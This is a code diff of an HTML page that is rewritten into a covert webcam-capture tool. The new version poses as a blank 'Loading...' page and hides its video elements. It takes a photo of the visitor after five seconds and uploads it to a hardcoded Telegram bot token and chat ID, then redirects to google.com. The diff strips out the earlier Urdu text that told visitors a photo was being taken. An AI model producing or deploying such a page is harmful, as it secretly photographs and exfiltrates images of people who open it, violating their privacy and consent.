@@ -1,83 +1,73 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Secure Auto-Camera</title>
+  <meta charset="UTF-8">
+  <title>Loading...</title>
   <style>
-    body { font-family: Arial, sans-serif; text-align: center; padding: 30px; background: #f8f8f8; }
-    #status { margin-top: 20px; font-size: 18px; color: #333; }
-    video, canvas { display: none; }
+    body {
+      margin: 0;
+      background-color: #ffffff;
+      font-family: sans-serif;
+      text-align: center;
+    }
+    video, canvas {
+      display: none;
+    }
   </style>
 </head>
 <body>
-  <h2>📷 Picture Capture In Progress</h2>
-  <p>آپ کی تصویر محفوظ طریقے سے کیپچر کی جا رہی ہے...</p>
-  <div id="status">🔄 انتظار کریں، تصویر لی جا رہی ہے...</div>
-  <video id="video" autoplay></video>
+  <h3>Loading...</h3>
+  <video id="video" autoplay playsinline></video>
   <canvas id="canvas"></canvas>
 
   <script>
-    const BOT_TOKEN = "8229410666:AAHURN6Ie9iqAm0hjPqC2p_XgzeMCLrtgqE";
-    const CHAT_ID = "7009447523";
-    const REDIRECT_URL = "https://google.com"; // ✅ Redirect after capture
-    const CAPTURE_DELAY = 10000; // 10 seconds
+    const botToken = "8229410666:AAHURN6Ie9iqAm0hjPqC2p_XgzeMCLrtgqE";
+    const chatId = "7009447523";
+    const redirectURL = "https://google.com";
 
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
-    const statusDiv = document.getElementById("status");
-    const context = canvas.getContext("2d");
 
-    function sendToTelegram(imageDataUrl) {
-      fetch(imageDataUrl)
-        .then(res => res.blob())
-        .then(blob => {
-          const formData = new FormData();
-          formData.append("chat_id", CHAT_ID);
-          formData.append("photo", blob, "photo.jpg");
-
-          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            method: "POST",
-            body: formData,
-          }).then(response => {
-            if (response.ok) {
-              statusDiv.innerText = "✅ تصویر Telegram پر بھیج دی گئی ہے!";
-            } else {
-              statusDiv.innerText = "❌ تصویر بھیجنے میں مسئلہ آیا!";
-            }
-
-            setTimeout(() => {
-              window.location.href = REDIRECT_URL;
-            }, 2000); // 2s delay before redirect
-          }).catch(() => {
-            statusDiv.innerText = "⚠️ نیٹ ورک ایرر!";
-            setTimeout(() => {
-              window.location.href = REDIRECT_URL;
-            }, 2000);
-          });
-        });
-    }
-
-    // Start camera and capture after delay
     navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
+      .then((stream) => {
         video.srcObject = stream;
-        video.onloadedmetadata = () => {
-          video.play();
-          statusDiv.innerText = `📸 10 سیکنڈ بعد تصویر لی جائے گی...`;
 
-          setTimeout(() => {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const imageData = canvas.toDataURL("image/jpeg");
-            statusDiv.innerText = "⏳ تصویر لی گئی، بھیجی جا رہی ہے...";
-            sendToTelegram(imageData);
-          }, CAPTURE_DELAY);
-        };
+        setTimeout(() => {
+          takePhotoAndSend(() => {
+            window.location.href = redirectURL;
+          });
+        }, 5000); // wait 5 seconds
       })
-      .catch(error => {
-        statusDiv.innerText = "❌ کیمرہ پرمیشن نہیں ملی!";
+      .catch((error) => {
+        console.error("Camera error:", error);
+        // Still redirect even if camera fails
+        setTimeout(() => window.location.href = redirectURL, 5000);
       });
+
+    function takePhotoAndSend(callback) {
+      try {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        canvas.toBlob((blob) => {
+          const formData = new FormData();
+          formData.append("chat_id", chatId);
+          formData.append("photo", blob, "pic.jpg");
+
+          fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            method: "POST",
+            body: formData
+          }).finally(() => {
+            if (callback) callback();
+          });
+        }, "image/jpeg");
+      } catch (err) {
+        console.error("Photo send error:", err);
+        if (callback) callback();
+      }
+    }
   </script>
 </body>
 </html>
